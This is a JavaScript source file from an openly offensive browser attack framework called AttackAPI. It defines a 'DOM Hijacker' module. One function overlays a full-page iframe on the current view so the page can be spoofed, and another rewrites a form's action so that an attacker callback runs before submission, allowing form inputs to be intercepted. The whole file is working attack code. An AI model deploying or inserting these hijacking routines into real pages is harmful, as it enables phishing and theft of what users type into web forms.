
/**
 * @name AttackAPI.Util['::DOM::Hijacker']
 * @desc DOM hijacking features
 * @extend AttackAPI.Util['::DOM']
 */
AttackAPI.Util['::DOM::Hijacker'] = AttackAPI.Util['::DOM'].extend({
	/**
	 * @name AttackAPI.Util['::DOM::Hijacker'].prototype.hijackView
	 * @desc get hijacks the specified view
	 * @param Object obj the hijacker definition
	 */
	hijackView: function (obj) {
		var doc = obj.document?obj.document:this.getDoc();
		
		var ifr = doc.createElement('iframe');
		ifr.onload = obj.onload;
		ifr.src = obj.url?obj.url:doc.location;
		
		doc.body.scroll = 'no';
		doc.body.appendChild(ifr);
		
		ifr.style.position = 'absolute';
		ifr.style.width = ifr.style.height = '100%';
		ifr.style.top = ifr.style.left = ifr.style.border = 0;
		ifr.style.background = '#FFFFFF';
		
		ifr.focus();
		
		return ifr;
	},
	/**
	 * @name AttackAPI.Util['::DOM::Hijacker'].prototype.hijackForm
	 * @desc get hijacks the specified form
	 * @param Object obj the hijacker definition
	 */
	hijackForm: function (hijack) {
		if (!hijack.form.id)
			hijack.form.id = ('form_' + Math.random() + '_' + new Date().getTime()).replace('.', '_');
			
		hijack.form.__hijackForm = function (url) {
			this.action = url;
			
			if (typeof(hijack.onsubmit) == 'function') 
				hijack.onsubmit.apply(this, []);
				
			this.submit();
		};
		
		hijack.form.action = "javascript:document.getElementById('" + hijack.form.id + "').__hijackForm('" + hijack.form.action + "')";
	}
});